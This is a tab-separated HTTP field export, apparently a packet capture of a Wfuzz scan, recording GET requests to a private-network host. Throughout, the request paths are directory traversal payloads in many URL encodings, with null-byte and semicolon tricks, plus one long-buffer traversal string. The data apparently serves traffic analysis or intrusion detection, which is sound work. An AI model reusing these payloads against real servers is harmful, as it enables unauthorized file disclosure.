http.accept	http.accept_encoding	http.accept_language	http.authbasic	http.authcitrix	http.authcitrix.domain	http.authcitrix.password	http.authcitrix.session	http.authcitrix.user	http.authorization	http.bad_header_name	http.cache_control	http.chat	http.chunk_boundary	http.chunk_size	http.chunkd_and_length	http.chunked_trailer_part	http.connection	http.content_encoding	http.content_length	http.content_length_header	http.content_type	http.cookie_pair	http.date	http.decompression_disabled	http.decompression_failed	http.file_data	http.host	http.http2_settings	http.http2_settings_uri	http.last_modified	http.leading_crlf	http.location	http.next_request_in	http.next_response_in	http.notification	http.prev_request_in	http.proxy_authenticate	http.proxy_authorization	http.proxy_connect_host	http.proxy_connect_port	http.referer	http.request	http.request.full_uri	http.request.line	http.request.method	http.request.uri.path	http.request.uri.query	http.request.uri.query.parameter	http.request.version	http.request_in	http.request_number	http.sec_websocket_accept	http.sec_websocket_extensions	http.sec_websocket_key	http.sec_websocket_protocol	http.sec_websocket_version	http.server	http.set_cookie	http.ssl_port	http.subdissector_failed	http.te_and_length	http.te_unknown	http.time	http.tls_port	http.transfer_encoding	http.unknown_header	http.upgrade	http.user_agent	http.www_authenticate	http.x_forwarded_for	http.cookie	http.request.uri
*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*																					application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded						192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109									13680,13680,13680,13680,13680,13680,13680,13680,13680,13680,13680,13680,13680,13680,13680						1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1	http://192.168.1.109/web/../../../../../../{FILE}%00index.html/,http://192.168.1.109/web/%2e%2e%2f{FILE}%00index.html/,http://192.168.1.109/web/%2e%2e%2f%2e%2e%2f%2e%2e%2f{FILE}%00index.html/,http://192.168.1.109/web/..%2f..%2f..%2f..%2f..%2f..%2f..%2f{FILE}%00index.html/,http://192.168.1.109/web/%252e%252e/%252e%252e/%252e%252e/%252e%252e/{FILE}%00index.html/,http://192.168.1.109/web/..\..\..\..\..\{FILE}%00index.html/,http://192.168.1.109/web/%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f{FILE}%00index.html/,http://192.168.1.109/web/..%5c..%5c..%5c{FILE}%00index.html/,http://192.168.1.109/web/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c{FILE}%00index.html/,http://192.168.1.109/web/%2e%2e\%2e%2e\%2e%2e\{FILE}%00index.html/,http://192.168.1.109/web/%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c{FILE}%00index.html/,http://192.168.1.109/web/%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\{FILE}%00index.html/,http://192.168.1.109/web/%252e%252e\%252e%252e\%252e%252e\{FILE}%00index.html/,http://192.168.1.109/web/..%255c..%255c..%255c..%255c..%255c..%255c{FILE}%00index.html/,http://192.168.1.109/web/%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c{FILE}%00index.html/,http://192.168.1.109/web/../../../../../{FILE};index.html/		GET,GET,GET,GET,GET,GET,GET,GET,GET,GET,GET,GET,GET,GET,GET,GET				HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1																			Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0				/web/../../../../../../{FILE}%00index.html/,/web/%2e%2e%2f{FILE}%00index.html/,/web/%2e%2e%2f%2e%2e%2f%2e%2e%2f{FILE}%00index.html/,/web/..%2f..%2f..%2f..%2f..%2f..%2f..%2f{FILE}%00index.html/,/web/%252e%252e/%252e%252e/%252e%252e/%252e%252e/{FILE}%00index.html/,/web/..\..\..\..\..\{FILE}%00index.html/,/web/%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f{FILE}%00index.html/,/web/..%5c..%5c..%5c{FILE}%00index.html/,/web/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c{FILE}%00index.html/,/web/%2e%2e\%2e%2e\%2e%2e\{FILE}%00index.html/,/web/%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c{FILE}%00index.html/,/web/%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\{FILE}%00index.html/,/web/%252e%252e\%252e%252e\%252e%252e\{FILE}%00index.html/,/web/..%255c..%255c..%255c..%255c..%255c..%255c{FILE}%00index.html/,/web/%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c{FILE}%00index.html/,/web/../../../../../{FILE};index.html/
*/*,*/*,*/*,*/*,*/*,*/*,*/*																					application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded						192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109									13682,13682,13682,13682,13682,13682						1,1,1,1,1,1,1	http://192.168.1.109/web/../../../../../../../../{FILE}%00index.html/,http://192.168.1.109/web/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/{FILE}%00index.html/,http://192.168.1.109/web/..%2f..%2f..%2f..%2f{FILE}%00index.html/,http://192.168.1.109/web/%252e%252e/%252e%252e/%252e%252e/{FILE}%00index.html/,http://192.168.1.109/web/..\..\..\..\{FILE}%00index.html/,http://192.168.1.109/web/%2e%2e%5c%2e%2e%5c%2e%2e%5c{FILE}%00index.html/,http://192.168.1.109/web/../../{FILE};index.html/		GET,GET,GET,GET,GET,GET,GET				HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1																			Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0				/web/../../../../../../../../{FILE}%00index.html/,/web/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/{FILE}%00index.html/,/web/..%2f..%2f..%2f..%2f{FILE}%00index.html/,/web/%252e%252e/%252e%252e/%252e%252e/{FILE}%00index.html/,/web/..\..\..\..\{FILE}%00index.html/,/web/%2e%2e%5c%2e%2e%5c%2e%2e%5c{FILE}%00index.html/,/web/../../{FILE};index.html/
*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*																					application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded						192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109									13694,13694,13694,13694,13694,13694,13694						1,1,1,1,1,1,1,1	http://192.168.1.109/web/../../../../../{FILE}%00index.html/,http://192.168.1.109/web/%2e%2e%2f%2e%2e%2f{FILE}%00index.html/,http://192.168.1.109/web/..%2f..%2f..%2f..%2f..%2f..%2f{FILE}%00index.html/,http://192.168.1.109/web/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f{FILE}%00index.html/,http://192.168.1.109/web/..\..\..\{FILE}%00index.html/,http://192.168.1.109/web/%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c{FILE}%00index.html/,http://192.168.1.109/web/%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c{FILE}%00index.html/,http://192.168.1.109/web/../../../../../../../../{FILE};index.html/		GET,GET,GET,GET,GET,GET,GET,GET				HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1																			Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0				/web/../../../../../{FILE}%00index.html/,/web/%2e%2e%2f%2e%2e%2f{FILE}%00index.html/,/web/..%2f..%2f..%2f..%2f..%2f..%2f{FILE}%00index.html/,/web/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f{FILE}%00index.html/,/web/..\..\..\{FILE}%00index.html/,/web/%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c{FILE}%00index.html/,/web/%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c{FILE}%00index.html/,/web/../../../../../../../../{FILE};index.html/
*/*																					application/x-www-form-urlencoded						192.168.1.109															1	http://192.168.1.109/web/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/{FILE};index.html/		GET				HTTP/1.1																			Wfuzz/3.1.0				/web/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/{FILE};index.html/
*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*																					application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded						192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109									13750,13750,13750,13750,13750,13750,13750,13750,13750,13750						1,1,1,1,1,1,1,1,1,1,1	http://192.168.1.109/web/../../{FILE}%00index.html/,http://192.168.1.109/web/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/{FILE}%00index.html/,http://192.168.1.109/web/..%252f..%252f..%252f{FILE}%00index.html/,http://192.168.1.109/web/%252e%252e/%252e%252e/{FILE}%00index.html/,http://192.168.1.109/web/..\..\{FILE}%00index.html/,http://192.168.1.109/web/%2e%2e%5c%2e%2e%5c{FILE}%00index.html/,http://192.168.1.109/web/../{FILE};index.html/,http://192.168.1.109/web/..%2f..%2f{FILE};index.html/,http://192.168.1.109/web/..%2f..%2f..%2f..%2f..%2f{FILE};index.html/,http://192.168.1.109/web/..%2f..%2f..%2f..%2f..%2f..%2f{FILE};index.html/,http://192.168.1.109/web/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/{FILE};index.html/		GET,GET,GET,GET,GET,GET,GET,GET,GET,GET,GET				HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1																			Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0				/web/../../{FILE}%00index.html/,/web/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/{FILE}%00index.html/,/web/..%252f..%252f..%252f{FILE}%00index.html/,/web/%252e%252e/%252e%252e/{FILE}%00index.html/,/web/..\..\{FILE}%00index.html/,/web/%2e%2e%5c%2e%2e%5c{FILE}%00index.html/,/web/../{FILE};index.html/,/web/..%2f..%2f{FILE};index.html/,/web/..%2f..%2f..%2f..%2f..%2f{FILE};index.html/,/web/..%2f..%2f..%2f..%2f..%2f..%2f{FILE};index.html/,/web/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/{FILE};index.html/
*/*,*/*,*/*,*/*																					application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded						192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109									13752,13752,13752						1,1,1,1	http://192.168.1.109/web/../../../../{FILE}%00index.html/,http://192.168.1.109/web/%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\{FILE}%00index.html/,http://192.168.1.109/web/..%2f..%2f..%2f..%2f{FILE};index.html/,http://192.168.1.109/web/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/{FILE};index.html/		GET,GET,GET,GET				HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1																			Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0				/web/../../../../{FILE}%00index.html/,/web/%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\{FILE}%00index.html/,/web/..%2f..%2f..%2f..%2f{FILE};index.html/,/web/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/{FILE};index.html/
*/*,*/*,*/*,*/*																					application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded						192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109									13766,13766,13766						1,1,1,1	http://192.168.1.109/web/..%252f..%252f{FILE}%00index.html/,http://192.168.1.109/web/%2e%2e%5c{FILE}%00index.html/,http://192.168.1.109/web/..%2f{FILE};index.html/,http://192.168.1.109/web/%2e%2e/%2e%2e/%2e%2e/%2e%2e/{FILE};index.html/		GET,GET,GET,GET				HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1																			Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0				/web/..%252f..%252f{FILE}%00index.html/,/web/%2e%2e%5c{FILE}%00index.html/,/web/..%2f{FILE};index.html/,/web/%2e%2e/%2e%2e/%2e%2e/%2e%2e/{FILE};index.html/
*/*,*/*																					application/x-www-form-urlencoded,application/x-www-form-urlencoded						192.168.1.109,192.168.1.109									13768						1,1	http://192.168.1.109/web/..%2f..%2f..%2f{FILE};index.html/,http://192.168.1.109/web/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/{FILE};index.html/		GET,GET				HTTP/1.1,HTTP/1.1																			Wfuzz/3.1.0,Wfuzz/3.1.0				/web/..%2f..%2f..%2f{FILE};index.html/,/web/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/{FILE};index.html/
*/*,*/*																					application/x-www-form-urlencoded,application/x-www-form-urlencoded						192.168.1.109,192.168.1.109									13770						1,1	http://192.168.1.109/web/..%2f..%2f..%2f..%2f..%2f..%2f..%2f{FILE};index.html/,http://192.168.1.109/web/%2e%2e/%2e%2e/%2e%2e/{FILE};index.html/		GET,GET				HTTP/1.1,HTTP/1.1																			Wfuzz/3.1.0,Wfuzz/3.1.0				/web/..%2f..%2f..%2f..%2f..%2f..%2f..%2f{FILE};index.html/,/web/%2e%2e/%2e%2e/%2e%2e/{FILE};index.html/
*/*,*/*																					application/x-www-form-urlencoded,application/x-www-form-urlencoded						192.168.1.109,192.168.1.109									13794						1,1	http://192.168.1.109/web/%2e%2e%2f{FILE};index.html/,http://192.168.1.109/web/%2e%2e/%2e%2e/{FILE};index.html/		GET,GET				HTTP/1.1,HTTP/1.1																			Wfuzz/3.1.0,Wfuzz/3.1.0				/web/%2e%2e%2f{FILE};index.html/,/web/%2e%2e/%2e%2e/{FILE};index.html/
*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*																					application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded						192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109									14093,14093,14093,14093,14093,14093,14093,14093,14093,14093,14093,14093,14093,14093,14093						1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1	http://192.168.1.109/web/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f{FILE};index.html/,http://192.168.1.109/web/..%252f..%252f..%252f..%252f..%252f..%252f..%252f{FILE};index.html/,http://192.168.1.109/web/%252e%252e%252f{FILE};index.html/,http://192.168.1.109/web/%252e%252e/%252e%252e/%252e%252e/%252e%252e/{FILE};index.html/,http://192.168.1.109/web/..\..\..\..\..\..\{FILE};index.html/,http://192.168.1.109/web/%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f{FILE};index.html/,http://192.168.1.109/web/..%5c..%5c{FILE};index.html/,http://192.168.1.109/web/..%5c..%5c..%5c..%5c..%5c{FILE};index.html/,http://192.168.1.109/web/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c{FILE};index.html/,http://192.168.1.109/web/..%255c{FILE};index.html/,http://192.168.1.109/web/%2e%2e%5c{FILE};index.html/,http://192.168.1.109/web/..%255c..%255c{FILE};index.html/,http://192.168.1.109/web/..%255c..%255c..%255c..%255c..%255c..%255c{FILE};index.html/,http://192.168.1.109/web/\../\../\../\../\../{FILE}/,http://192.168.1.109/web/%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c{FILE};index.html/,http://192.168.1.109/web/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/../../../{FILE}/		GET,GET,GET,GET,GET,GET,GET,GET,GET,GET,GET,GET,GET,GET,GET,GET				HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1																			Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0				/web/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f{FILE};index.html/,/web/..%252f..%252f..%252f..%252f..%252f..%252f..%252f{FILE};index.html/,/web/%252e%252e%252f{FILE};index.html/,/web/%252e%252e/%252e%252e/%252e%252e/%252e%252e/{FILE};index.html/,/web/..\..\..\..\..\..\{FILE};index.html/,/web/%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f{FILE};index.html/,/web/..%5c..%5c{FILE};index.html/,/web/..%5c..%5c..%5c..%5c..%5c{FILE};index.html/,/web/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c{FILE};index.html/,/web/..%255c{FILE};index.html/,/web/%2e%2e%5c{FILE};index.html/,/web/..%255c..%255c{FILE};index.html/,/web/..%255c..%255c..%255c..%255c..%255c..%255c{FILE};index.html/,/web/\../\../\../\../\../{FILE}/,/web/%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c{FILE};index.html/,/web/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/../../../{FILE}/
